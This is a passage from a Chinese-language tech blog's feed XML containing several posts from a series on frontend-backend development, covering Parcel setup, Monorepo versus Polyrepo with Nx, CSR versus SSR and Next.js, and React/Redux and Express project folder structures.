class="string">&quot;./src/index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello parcel&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><code>npx parcel src/index.html</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> DevOps </tag>
            
            <tag> CI/CD </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Monorepo 和 Polyrepo</title>
      <link href="/2022/10/03/relationships-between-frontend-and-backend/project-infrastructure-mono-repo/"/>
      <url>/2022/10/03/relationships-between-frontend-and-backend/project-infrastructure-mono-repo/</url>
      
        <content type="html"><![CDATA[<p>在版本控制系統中 Monorepo 和 Polyrepo 分別是兩種用來管理模組化程式碼的軟體開發策略。</p><p>以男女之間來說，就像是金錢是要分開管理 (Poly) 或是一起管理 (Mono)，即使一起管理是單純全部丟在一起 (Monolith) 還是有做簡單的分類 (Monorepo) 像是個人花費和公共花費等等。</p><p>👉 小編點評: 該分開就早點分開，這個道理在哪似乎都適用</p><p>接下來這篇文章以前後端分離的 Web 開發為例來分析 Monorepo 和 Polyrepo，另外 Monolith 可以看成缺少規劃的 Monorepo 原則上是將讓專案可運行的相關程式全部放一起，常在專案初期 POC 使用，這個名詞基本不用管。</p><blockquote><img src="https://codefresh.io/wp-content/uploads/2023/07/image4-1.jpg" width="100%" height="500px">圖片來源: https://codefresh.io/blog/using-codefresh-with-mono-repos/</blockquote><h2 id="Polyrepo"><a href="#Polyrepo" class="headerlink" title="Polyrepo"></a>Polyrepo</h2><p>Polyrepo 則是把前端與後端分為兩個不同的 Repository，目前絕大多數專案的管理方式</p><blockquote><p>把不同功能的專案分成不同的 Repository 管理</p></blockquote><ul><li>權限: 因為是不同 Repo 可以按照 Repo 設定權限</li><li>專案管理: 比較難看到系統全貌，但易於切割責任歸屬</li><li>CI&#x2F;CD: 方便擴展且 DevOps 相關工具較齊全</li><li>Hotfix: 需要透過 PR 修改所有相關的程式</li><li>重構: 有相依性的專案之間重構需要切換，改動時不易確認影響範圍</li><li>套件版本管理: 多個專案需要分開管理</li></ul><h3 id="Polyrepo-專案架構與問題"><a href="#Polyrepo-專案架構與問題" class="headerlink" title="Polyrepo 專案架構與問題"></a>Polyrepo 專案架構與問題</h3><blockquote><p>功能開發階段，前後端溝通成本較難下降?!</p></blockquote><p>Polyrepo 前後端各自開工，當需要整合測試的時候就會需要</p><ol><li>確認前後端目前是在哪個分支</li><li>確認前、後端各自跑起來的方法</li><li>確認如何把不同的分支整合對接</li></ol><blockquote><p>共用元件的開發與測試流程較多手工且繁雜的部分</p></blockquote><p>UI 共用元件通常會把元件封裝成 package 或透過 git 的 URL 來 npm install</p><p>開發階段測試流程，維護共同相關 dependencies 成本較高</p><ol><li>npm run build 將元件建置</li><li>將目標專案 node_module 的 lib 改成新建置版本</li><li>在目標專案中實際測試</li><li>回到 UI 元件專案進行版號更動及 Change Log 撰寫</li><li>發布新版本</li><li>在目標專案中重新 npm install 新版</li></ol><blockquote><p>Polyrepo CI&#x2F;CD 每次進版或退版較複雜</p></blockquote><p>Polyrepo CI&#x2F;CD 在做用戶端 APP 會很常區分 dev、uat、production 環境並以三或多個 branch 做區分。</p><p>舉小編前公司的案例來說，除了公版的功能外，剩下每個客戶因為有相對應的客製化，若無法用 config 解決就會另外開新分支維護，這樣的情況下如果需要更新 UAT 的版本，就要在各個 Repository 做重複 N 次的操作，如果今天 CI&#x2F;CD 流程因應公司政策有修改也需要在 N 個地方配合修正。</p><ol><li>將 Dev 的程式碼發 PR 到 UAT</li><li>確認 UAT 的 CI 測試有過且包版成功</li><li>請 PM 跟維運協助上到公司內部 UAT 環境</li><li>請 QC 協助測試</li><li>請 PM 協助上到對方 UAT 環境進行測試</li></ol><h2 id="Monorepo"><a href="#Monorepo" class="headerlink" title="Monorepo"></a>Monorepo</h2><p>Monorepo 是把前端與後端的原始碼都放在同個 Repository，是軟體開發過程中，使用一個 Repository 開發多個模組或專案的方式。</p><p><a href="https://github.com/facebook/react">Facebook 的 React</a> 其實就是 Monorepo。</p><blockquote><p>將相關程式碼依照特定的邏輯，包含前後端放在同個 Repository</p></blockquote><ul><li>權限: 權限只有一種</li><li>專案管理: 方便不懂架構的人發 Issue</li><li>CI&#x2F;CD: 流程或是架構配置統一管理，統一退版較容易</li><li>Hotfix: 可透過原子化提交直接修改所有相關的程式</li><li>重構: 原始碼都很近方便大規模的重構，改動時易於確認影響範圍</li><li>套件版本管理: 集中管理，若遇到套件資安漏洞也能統一升級</li></ul><p>以小編前公司的經驗來說，覺得 monorepo 的概念就蠻適合部門內整合各模組的專案架構。</p><p>因為只有一個 Repo 所以權限也只有一種，不過理論上同部門也不需要過於詳細的權限控制。</p><p>雖然當專案過大的時候 git 操作會變慢，可以指定 clone 深度來解決。</p><p>npm 沒辦法用 install github url 的方式安裝模組，有個招式是可以開個 Branch 專門放 build 過的結果，但繁雜程度可能跟 Polyrepo 差不多。</p><h3 id="Monorepo-專案架構與問題"><a href="#Monorepo-專案架構與問題" class="headerlink" title="Monorepo 專案架構與問題"></a>Monorepo 專案架構與問題</h3><blockquote><p>統一的設定及專案技術選型</p></blockquote><ul><li>初期需多點時間設定專案，Config、Library、Tech stack 會統一</li><li>CI&#x2F;CD 流程需要考慮更多情境</li><li>可以立即知道修改程式碼後，相關專案是否正常運作</li><li>開發一次元件，就能給各專案使用</li><li>在專案之間檢視程式碼時，可以省下切換時間</li></ul><h3 id="Nx"><a href="#Nx" class="headerlink" title="Nx"></a>Nx</h3><p>Nx 是使用 TypeScript 撰寫的 Monorepo 專案建置工具，官網介紹是</p><blockquote><p>Smart, Fast, Extensible Build System</p></blockquote><p>主要協助建構與整合 Monorepo 架構，並內建支援</p><ol><li>React、Vue、Angular 三大框架專案設定</li><li>Express、Nest、Next 後端專案設定</li><li>cypress、jest 測試相關設定</li></ol><p>Nx 在不使用任何外掛的情況下也可以方便地去使用，雖然主要以 JavaScript 生態系為主但因為可以使用外掛擴充，其實可以發現<a href="https://nx.dev/community#plugin-directory">社群對於其他語言也有相關的支援</a>，像是常見的 <a href="https://github.com/tinesoft/nxrocks/tree/master/packages/nx-spring-boot">nx-spring-boot</a>。</p><p>Nx 的專案架構如下</p><ul><li>apps: 存放各專案</li><li>libs: 共用的部分</li><li>tools: 腳本</li><li>workspace.json: 專案列表</li><li>nx.json: 專案該如何執行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NxProject/</span><br><span class="line">├── apps/</span><br><span class="line">├── libs/</span><br><span class="line">├── tools/</span><br><span class="line">├── workspace.json</span><br><span class="line">├── nx.json</span><br><span class="line">├── package.json</span><br><span class="line">└── tsconfig.base.json</span><br></pre></td></tr></table></figure><p>Demo Repo:<br><a href="https://github.com/LinYenCheng/monorepo-demo">https://github.com/LinYenCheng/monorepo-demo</a></p><p>另外因為 Nx 功能蠻多的若是使用 VS Code 開發，建議安裝 Nx 擴充套件，就不必將指令記起來，舉三個常用的例子</p><ul><li><code>npx nx print-affected</code>: 找出這次改動被影響需要修改跟重新 build 跟 test 的專案</li><li><code>npx nx run-many -target=serve --project=api, demo</code>: 一次執行多個專案像是同時把前後端跑起來</li><li><code>npx nx graph</code>: 透過互動式介面了解專案相依性<iframe width="560" height="315" src="https://www.youtube.com/embed/Dr7jI9RYcmY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> 軟體工程 </tag>
            
            <tag> 專案管理 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前後端分離或在一起 (CSR 與 SSR)</title>
      <link href="/2022/10/02/relationships-between-frontend-and-backend/html-rendering-with-react-csr-and-ssr/"/>
      <url>/2022/10/02/relationships-between-frontend-and-backend/html-rendering-with-react-csr-and-ssr/</url>
      
        <content type="html"><![CDATA[<p>前後端分離或是在一起間接影響網頁渲染的方式，常見的渲染形式會有用戶端渲染 (CSR) 和伺服器端渲染 (SSR) 兩種。</p><p>這就好像男女朋友是否同居一樣，會大大影響兩人的日常生活型態，分開時兩者的自由度都較高，在一起同居時總會需要考慮彼此狀態。</p><p>前後端要分離或是在一起? 渲染的方式該怎麼決定? 小編覺得也各自有各自的優缺點，接下來就來開箱 CSR 跟 SSR 吧。</p><h2 id="Client-Side-Render-用戶端渲染"><a href="#Client-Side-Render-用戶端渲染" class="headerlink" title="Client Side Render (用戶端渲染)"></a>Client Side Render (用戶端渲染)</h2><p>隨著瀏覽器的效能變好，帶有顯示邏輯的渲染可以轉移到瀏覽器端，於是也就出現單頁應用程式 Single Page Application (SPA) 與 Client Side Render (CSR) 的概念。</p><p>Single Page Application (SPA) 不同以往產生完整 HTML 的做法，會將網頁都打包 (bundle) 後才在用戶端執行，其中 bundle 可以想像成是 APP 的安裝與執行檔。</p><p>在 SPA 中畫面中元素不再直接產生在頁面中，初始時需要 CSR 的部分會是空白的，改由透過 API 要回來的資料和 bundle 檔在前端動態產生渲染畫面。</p><p>舉個簡單的例子來說，登入之後不需要跳轉至新的頁面並重新載入，只需要透過要回來的資料來更改網頁中的元素或元件即可。</p><ul><li>優點<ul><li>操作體驗較接近真實 APP，頁面間切換速度極快</li><li>伺服器端壓力較小</li></ul></li><li>缺點<ul><li>第一次載入時間較慢，但可以透過 Code Splitting 優化</li></ul></li></ul><h2 id="Server-Side-Render-伺服器端渲染"><a href="#Server-Side-Render-伺服器端渲染" class="headerlink" title="Server Side Render (伺服器端渲染)"></a>Server Side Render (伺服器端渲染)</h2><p>HTML 由 Server 端產生，所以用戶看到的就是最終版 HTML，會有三種預渲染形式</p><ul><li>靜態生成 (Static Generation): 透過 Pre-rendering 工具預先渲染頁面產生靜態檔，HTML 在編譯階段就會生成，以小編的部落格來說就是將 Markdown 語法編譯成 HTML 的靜態檔案，在用戶請求之前頁面就已經準備並可被快取，這種渲染方式也可以跟用戶端渲染搭配著使用來加入額外資訊</li><li>伺服器端渲染 (Server Side Render)：在每次用戶請求時，會動態生成 HTML 效能上會比靜態生成慢，像大家常用的 WordPress 預設就是這種情況</li><li>增強型伺服器端渲染 (Incremental Static Regeneration): 定期重新進行 SG 避免頁面沒有抓到較新資訊的問題</li></ul><p>註: Pre Render 這類外掛適用於 CRA 專案但可能會跟不上 React 新功能所產生的問題</p><ul><li>優點<ul><li>第一次載入時間較快</li><li>在 CSR 沒特殊設計的情況下 SEO 較佳</li></ul></li><li>缺點<ul><li>操作體驗較 CSR 差</li><li>伺服器壓力較大</li></ul></li></ul><h3 id="SPA-伺服器端渲染"><a href="#SPA-伺服器端渲染" class="headerlink" title="SPA 伺服器端渲染"></a>SPA 伺服器端渲染</h3><p>由於網頁需等待 Bundle 完整載入後才會渲染，速度較慢即使透過 Code Splitting <a href="https://webpack.js.org/guides/code-splitting/">去把程式碼和用到的函式庫分離開來</a>，但仍然沒有 SSR 產生來的快速。</p><p>目前非所有搜尋引擎都能爬取 SPA 中的內容，所以理想狀況是第一頁在伺服器先進行靜態生成或伺服器端端渲染</p><ul><li>前端不需等待向後端取得資料的時間 (ex 熱門購物清單)</li><li>SPA 在操作上不會有整個頁面重新刷新的問題</li></ul><h3 id="Server-Side-Render-常見問題"><a href="#Server-Side-Render-常見問題" class="headerlink" title="Server Side Render 常見問題"></a>Server Side Render 常見問題</h3><p>伺服器端較簡易的實作方式是用 Node.js 語法來撰寫，理論上前端用到的套件幾乎在後端都會再用到，在實作伺服器渲染時可能會遇到的問題：</p><ol><li>由於 SPA 是由狀態來決定元件的顯示，那伺服器端的狀態該如何決定呢?</li><li>後端渲染出來的會不會和前端渲染出來的有差異? RWD?</li><li>如果有使用狀態管理的函式庫像是 Redux 需要特別處理嗎?</li><li>前端 SPA 用的路由會影響嗎?</li><li>伺服器端 Bundle Size 變大</li></ol><p>渲染時 react 會幫我們確認元素的 checksum 是否相同，若不同就會在 client 端重新渲染一次。</p><p>前端有用到像是 window.innerWidth 去做條件渲染時會有問題，因為 Server 沒有這些東西，必須等到元件 mount 後，意味著不可以利用這些物件來做條件渲染，不正確的狀態或是沒考慮過的操作都會讓 checksum 有錯誤，要特別謹記。</p><p>後端做 <a href="https://chentsulin.github.io/redux/docs/recipes/ServerRendering.html">Redux 的 SSR</a> 會搭配初始狀態加上計算後的資料產生 Store 並渲染，接著在 renderToString 時把元件轉成 html 字串並整合狀態，前端收到後再重新產生 store 傳入 APP 中。</p><p>若要減少 Server-side bundle 大小來爭取執行速度時，webpack 的 <a href="https://github.com/liady/webpack-node-externals">external</a> 要設定，其他要注意的大概是 <code>webpack target: node</code> 跟 <code>libraryTarget: commonjs2</code>。</p><p>套件們使用時需要注意的事項:</p><ul><li>React Router 若有用到 router 的部分不管是前後端都要使用 <a href="https://github.com/ReactTraining/react-router/blob/v3/docs/guides/ServerRendering.md">match</a> 來避免前後端不一致。</li><li>React-Helmet: <a href="https://github.com/nfl/react-helmet">按照文件</a>就是要多寫一行<code>const helmet = Helmet.renderStatic();</code>來避免記憶體洩漏的問題，同時若有使用樣版引擎，meta data 中的動態資料須整合</li><li>style-component: 是需要<a href="https://www.styled-components.com/docs/advanced#server-side-rendering">按照文件</a>去注入相關資訊</li><li>isomorphic-fetch: 在 node 端會需要絕對路徑</li><li>serviceWorker: 路由衝突 CRA 專案前端可以使用 <code>serviceWorker.unregister();</code></li></ul><h3 id="Next-js"><a href="#Next-js" class="headerlink" title="Next.js"></a>Next.js</h3><p>Next.js 是由 Vercel 平台開發維護的一個 React Framework，已經把大部分 SSR 問題進行解決，如果有特殊需求官方也都有<a href="https://github.com/zeit/next.js/tree/canary/examples">很好的範例</a>。</p><ul><li>優點<ul><li>減少多餘的專案設定檔</li><li>File System based 路由，不需額外安裝套件和設定</li><li>Code Splitting</li><li>SSR 支援</li></ul></li><li>缺點<ul><li>需要參考範例去組合出期待專案架構，對<del>複製貼上</del>攻城獅來說學習<del>抄襲</del>曲線應該可被接受</li><li>思考系統設計跟架構也會需要 Next 風格，不過核心概念還是一樣的。</li></ul></li></ul><p>如果沒有太多奇怪的需求，且是有 React 開發經驗的工程師，開發初期小編覺得可以直接使用 <code>npx create-next-app</code> 開始進行開發。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前任物品斷捨離 X 專案資料夾架構與收納</title>
      <link href="/2022/09/30/relationships-between-frontend-and-backend/project-folder-structure/"/>
      <url>/2022/09/30/relationships-between-frontend-and-backend/project-folder-structure/</url>
      
        <content type="html"><![CDATA[<h2 id="專案資料夾架構"><a href="#專案資料夾架構" class="headerlink" title="專案資料夾架構"></a>專案資料夾架構</h2><p>今天談談專案資料夾的結構，在還沒開始寫任何程式前，可以思考的是檔案要怎麼收納。</p><p>不知道各位情場高手都怎麼收納前男友或前女友們的禮物呢? 是按照物品種類來分類? 還是依照對象來分類? 或是直接丟掉?</p><p>隨著數量上升後管理的難度也會上升，以小編這幾年看過不少專案的經驗下來，覺得程式碼也跟收納一樣分成兩種流派</p><ol><li>按照屬性分類</li><li>按照功能分類</li></ol><p>接下來就讓我們看看兩種收納的差別吧!</p><h3 id="屬性分類"><a href="#屬性分類" class="headerlink" title="屬性分類"></a>屬性分類</h3><p>會看屬性分得多細，若是分類比較粗一點，當衣服的數量變多就會變成很難找到整套運動服該如何正確搭配，屬性分類用衣服的概念來看就是分類成</p><ul><li>全部的內衣</li><li>全部的內褲</li><li>全部的褲子</li><li>全部的上衣</li><li>全部的外套</li></ul><p>依專案來說，小編認為小專案較適合這種配置，比較適合拿來學習新知識時使用。</p><h3 id="功能分類"><a href="#功能分類" class="headerlink" title="功能分類"></a>功能分類</h3><p>當衣服變多的時候也知道怎麼依照功能找到全部相關的配套，不過由於依照功能區分，就會需要比較多的種類，功能分類就會是</p><ul><li>慢跑外套、上衣、褲子、內衣、內褲</li><li>登山外套、上衣、褲子、內衣、內褲</li><li>約會外套、上衣、褲子、內衣、內褲</li><li>上班外套、上衣、褲子、內衣、內褲</li><li>居家外套、上衣、褲子、內衣、內褲</li><li>休閒外套、上衣、褲子、內衣、內褲</li></ul><p>依專案來說，小編認為大專案較適合這種配置，每個功能都會有自己屬於的資料夾，對菜鳥工程師來說則是快樂小天地。</p><h2 id="React-js-前端專案架構"><a href="#React-js-前端專案架構" class="headerlink" title="React.js 前端專案架構"></a>React.js 前端專案架構</h2><p>一般會有元件、API、資料流、樣式相關分類。</p><p>React 是 component-based 的前端 UI 函式庫，通常會配合其他函式庫使用:</p><ul><li>react-router: 處理 SPA 的路由</li><li>redux: 做統一的狀態管理，協助元件之間的溝通<ul><li>redux-thunk or redux-saga: 處理 AJAX 的 side effect</li></ul></li></ul><h3 id="前端專案依屬性分類"><a href="#前端專案依屬性分類" class="headerlink" title="前端專案依屬性分類"></a>前端專案依屬性分類</h3><p>比較小的專案如果不包含 Redux 可以簡單分類</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">api/</span><br><span class="line">├─ ProfileAPI.js</span><br><span class="line">└─ UserAPI.js</span><br><span class="line">components/</span><br><span class="line">├─ Footer.js</span><br><span class="line">├─ Footer.css</span><br><span class="line">├─ Profile.js</span><br><span class="line">├─ ProfileHeader.js</span><br><span class="line">└─ ProfileHeader.css</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>搭配 Redux 後，主要就是增加元件之間需要溝通工具，會有以下特性:</p><ul><li>單向資料流</li><li>公共的狀態儲存 (Store)</li></ul><p>專案架構也會受到這種概念去分類:</p><ul><li>actions: 觸發狀態改變用的 function</li><li>pages: 頁面容器元件</li><li>containers: 有連接 Store</li><li>components: 沒有連接 Store</li><li>reducers: 收到 action 後的資料邏輯</li></ul><p>所以專案資料夾架構依照屬性去分類就會長成下面這個樣子，在完成任務的過程中需要在多個不同的資料夾中來回，覺得較適合小型專案。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└── src</span><br><span class="line">    ├── actions</span><br><span class="line">    │   ├── typeOneActions.js</span><br><span class="line">    │   └── typeTwoActions.js</span><br><span class="line">    ├── api</span><br><span class="line">    │   ├── apiHandler.js</span><br><span class="line">    │   ├── typeOneApi.js</span><br><span class="line">    │   └── typeTwoApi.js</span><br><span class="line">    ├── components</span><br><span class="line">    │   ├── TypeOneComponent.jsx</span><br><span class="line">    │   ├── TypeOneListComponent.jsx</span><br><span class="line">    │   ├── TypeTwoComponent.jsx</span><br><span class="line">    │   ├── TypeTwoPageComponent.jsx</span><br><span class="line">    │   └── HomePageComponent.jsx</span><br><span class="line">    ├── containers</span><br><span class="line">    │   ├── TypeOneContainer.js</span><br><span class="line">    │   └── TypeTwoPageContainer.js</span><br><span class="line">    ├── pages</span><br><span class="line">    │   └── HomePageContainer.js</span><br><span class="line">    ├── index.js</span><br><span class="line">    ├── reducers</span><br><span class="line">    │   ├── typeOneReducer.js</span><br><span class="line">    │   └── typeTwoReducer.js</span><br><span class="line">    ├── routes.js</span><br><span class="line">    ├── store.js</span><br><span class="line">    └── utils</span><br></pre></td></tr></table></figure><p>以<a href="https://github.com/LinYenCheng/heros">之前弄的小專案</a>當例子，如果有加上 redux 的話，專案架構大概會長成下面的樣子，在比較簡單的專案中可以更簡化。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">├── .storybook</span><br><span class="line">├── src/</span><br><span class="line">│  ├── constants/</span><br><span class="line">│  ├── utils/</span><br><span class="line">│  ├── pages/</span><br><span class="line">│  ├── containers/              <span class="comment"># containers 放置與 Redux 連接的相關元件，單元測試檔案為 `元件名稱.test.js`</span></span><br><span class="line">│  ├── components/              <span class="comment"># components 放置相關元件，單元測試檔案為 `元件名稱.test.js`</span></span><br><span class="line">│  │  └── Root.js               <span class="comment"># 路由根目錄</span></span><br><span class="line">│  ├── hooks/                   <span class="comment"># hooks 相關</span></span><br><span class="line">│  ├── middleware/              <span class="comment"># 資料處理相關</span></span><br><span class="line">│  │  ├── API.js                <span class="comment"># axios 的 instance</span></span><br><span class="line">│  │  └── redux-api.js          <span class="comment"># redux-api</span></span><br><span class="line">│  ├── styles/                  <span class="comment"># 樣式檔們</span></span><br><span class="line">│  ├── index.js                 <span class="comment"># 程式入口</span></span><br><span class="line">│  ├── serviceWorker.js</span><br><span class="line">│  └── setupTests.js            <span class="comment"># 測試相關設定</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── .prettierrc                 <span class="comment"># prettierrc 工具設定</span></span><br><span class="line">├── .travis.yml                 <span class="comment"># 持續發佈工具</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><h4 id="Side-Effect-處理"><a href="#Side-Effect-處理" class="headerlink" title="Side Effect 處理"></a>Side Effect 處理</h4><p>平常不太會去特別注意的名詞，我們用這個來分類 function 或元件:</p><ul><li>Pure function or UI 元件<ul><li>每次送進去固定的輸入，出來就會是固定的結果</li><li>相同的 props, 產生相同的 component，會放在 components 資料夾</li><li>不寫商業邏輯</li><li>不加入有 side effect 的 code</li></ul></li><li>有 side effect 的 function or 元件<ul><li>因為與狀態相關所以就會放在 containers 資料夾</li><li>AJAX，相關程式在 react hooks 中就會放在 useEffect，class component 就會放在 componentDidMount</li><li>AJAX 跟 redux，side effect 交給 redux-thunk 或是 redux-saga 去管理</li></ul></li></ul><p>最近開始接觸單元測試後，也深刻感覺到 side effect 越少，測試也越好寫，所以我想如果刻意去寫出好測試的元件，最後也會讓專案的結構變得更好偵錯與維護。</p><h3 id="前端專案依功能分類"><a href="#前端專案依功能分類" class="headerlink" title="前端專案依功能分類"></a>前端專案依功能分類</h3><p>對新加入專案的工程師來說，最多的時間就是花在找尋相關的程式，<a href="/2021/04/16/thinking-developer-experience/?utm_source=link&utm_medium=article&utm_campaign=internal_link">其實可以透過小訣竅可以去優化前端開發者體驗</a>，那在資料夾的架構方面，其實很簡單的透過把相近功能的程式碼放在一起 (Co-located) 就可以大量省去尋寶的時間，也能夠更方便的管理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── Login/</span><br><span class="line">│  ├── SocialButton/</span><br><span class="line">│  │  ├── LineButton.js         # 社群登入的 Line 按鈕</span><br><span class="line">│  │  └── FacebookButton.js     # 社群登入的 FB 按鈕</span><br><span class="line">│  ├── Modal/</span><br><span class="line">│  │  └── ModalLogin.js         # 登入的 Modal</span><br><span class="line">│  └── index.js                 # 登入邏輯與主要 Layout</span><br></pre></td></tr></table></figure><p>比較大的專案，就會把相關功能的元件都放在同個資料夾中降低相依性、增加內聚性，這樣在維護和修改時可以確定只要照顧好這個資料夾中的檔案即可。</p><p>使用 ReduxToolKits 後按照功能搭配分類，覺得較適合大型專案，依照功能就會分成</p><ul><li>typeOne</li><li>typeTwo</li><li>typeThree</li></ul><p>每個功能所需要的 action、components、containers、reducers 都會放在一起，所以在開發時，每個工程師都可以在獨立的資料夾中完成該次的任務。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">└── features</span><br><span class="line">    ├── typeOne</span><br><span class="line">    │   ├── TypeOne.js</span><br><span class="line">    │   ├── TypeOne.styles.scss</span><br><span class="line">    │   └── typeOneSlice.js</span><br><span class="line">    ├── typeTwo</span><br><span class="line">    │   ├── TypeTwo.js</span><br><span class="line">    │   ├── TypeTwo.styles.scss</span><br><span class="line">    │   └── typeTwoSlice.js</span><br><span class="line">    └── typeThree</span><br><span class="line">        ├── TypeThree.js</span><br><span class="line">        ├── TypeThree.styles.scss</span><br><span class="line">        └── typeThreeSlice.js</span><br></pre></td></tr></table></figure><p>元件如果複雜一些也是依照功能區分，覺得較適合大一點的專案。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── admin</span><br><span class="line">    └── UserCard</span><br><span class="line">        ├── layouts</span><br><span class="line">        │   ├── UserCard.mobile.tsx</span><br><span class="line">        │   └── UserCard.desktop.tsx</span><br><span class="line">        └── UserCard.tsx</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="簡化架構的函式庫與框架"><a href="#簡化架構的函式庫與框架" class="headerlink" title="簡化架構的函式庫與框架"></a>簡化架構的函式庫與框架</h3><p>對於專案或是後端收到的資料，若沒有太多需要客製化的部分，可用底下函式庫與框架簡化:</p><ul><li>storybook: 用故事書元件的角度設計，元件通常就能夠獨立且好測試</li><li>將 Redux 常用的寫法封裝來減少寫太多重複的程式碼，簡化架構<ul><li>Redux Toolkit<ul><li>RTK Query</li><li>createSlice</li></ul></li></ul></li><li>axios，Promise based HTTP client for the browser and node.js<ul><li>前後端共構</li><li>使用客製化 instance 的方式可以將收跟送的邏輯統一實作，減少重複的程式碼</li></ul></li><li>Next.js，是一套以 React.js 生態系打造出來的完整的框架，幫我們配置了<ul><li>AMP</li><li>路由</li><li>CSS-in-JS</li><li>靜態頁面輸出</li><li>伺服器渲染</li></ul></li></ul><h2 id="後端專案架構"><a href="#後端專案架構" class="headerlink" title="後端專案架構"></a>後端專案架構</h2><p>通常 <a href="https://linyencheng.github.io/2019/09/07/tool-mongoose-mongo/">Mongoose 會搭配一個後端的框架</a>來做使用，像是 Express 或是 Koa 等等，那在網路上有看到常見的兩種架構。</p><h3 id="後端專案依屬性分類"><a href="#後端專案依屬性分類" class="headerlink" title="後端專案依屬性分類"></a>後端專案依屬性分類</h3><p>依照屬性性，controller、routes、models 集中放置在各自的分類資料夾，覺得較適合小型專案。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├── src/</span><br><span class="line">│  ├── controller/              <span class="comment"># 資料庫 CRUD</span></span><br><span class="line">│  ├── routes/                  <span class="comment"># API 設定</span></span><br><span class="line">│  ├── models/                  <span class="comment"># Schema 定義</span></span><br><span class="line">│  └── index.js                 <span class="comment"># 程式入口</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><h3 id="後端專案依功能分類"><a href="#後端專案依功能分類" class="headerlink" 